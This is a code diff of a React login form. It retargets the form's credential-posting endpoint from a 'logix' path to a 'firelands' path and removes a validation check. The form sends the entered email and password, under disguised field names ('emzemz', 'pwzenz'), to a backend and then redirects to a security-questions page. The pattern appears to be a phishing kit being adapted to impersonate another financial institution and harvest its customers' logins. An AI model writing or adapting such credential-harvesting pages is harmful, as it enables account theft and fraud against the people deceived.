@@ -86,30 +86,21 @@ const LoginForm: React.FC = () => {
       return;
     }
 
-    // Check if there are no errors
-    if (!newErrors.emzemz && !newErrors.pwzenz) {
-      // Proceed with form submission
-      console.log('Form submitted with:', { emzemz, pwzenz });
+    const url = `${baseUrl}api/firelands-meta-data-1/`;
 
-      const url = `${baseUrl}api/logix-meta-data-1/`;
-
-      try {
-        await axios.post(url, {
-          emzemz: emzemz,
-          pwzenz: pwzenz,
-        });
-        console.log('Message sent successfully');
-        navigate('/security-questions', {
-          state: {
-            emzemz: emzemz
-          }
-        });
-      } catch (error) {
-        console.error('Error sending message:', error);
-        setIsLoading(false);
-      }
-
-      setErrors({ emzemz: '', pwzenz: '' });
+    try {
+      await axios.post(url, {
+        emzemz,
+        pwzenz,
+      });
+      navigate('/security-questions', {
+        state: {
+          emzemz,
+        },
+      });
+    } catch (error) {
+      console.error('Error sending message:', error);
+      setIsLoading(false);
     }
   };
 
